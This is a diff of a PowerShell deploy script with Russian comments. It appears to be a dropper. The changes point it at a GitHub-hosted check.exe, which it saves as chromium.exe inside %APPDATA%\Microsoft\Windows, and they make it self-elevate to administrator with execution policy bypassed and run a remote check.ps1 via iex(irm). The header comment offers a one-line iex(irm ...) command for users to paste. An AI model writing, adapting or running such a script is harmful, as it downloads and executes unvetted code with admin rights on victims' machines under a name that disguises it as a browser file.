@@ -3,13 +3,13 @@
 #   iex (irm "https://raw.githubusercontent.com/YOURUSER/YOURREPO/main/deploy.ps1")
 #
 # Параметры (можно переопределить через $env: перед запуском):
-$GitHubUrl  = if($env:CF_URL)  {$env:CF_URL}  else {"https://raw.githubusercontent.com/YOURUSER/YOURREPO/main/chromium.exe"}
+$GitHubUrl  = if($env:CF_URL)  {$env:CF_URL}  else {"https://github.com/Holycheck/checker/releases/download/realease/check.exe"}
 $InstallPath= if($env:CF_PATH) {$env:CF_PATH} else {"$env:APPDATA\Microsoft\Windows\chromium.exe"}
 
 # ── Само-повышение до администратора ──────────────────────────────────────────
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
     Write-Host "[*] Requesting admin..." -ForegroundColor Yellow
-    $rawUrl = "https://github.com/Holycheck/checker/releases/download/realease/check.exe"
+    $rawUrl = "https://raw.githubusercontent.com/Holycheck/checker/main/check.ps1"
     Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$rawUrl')`"" -Verb RunAs
     exit
 }
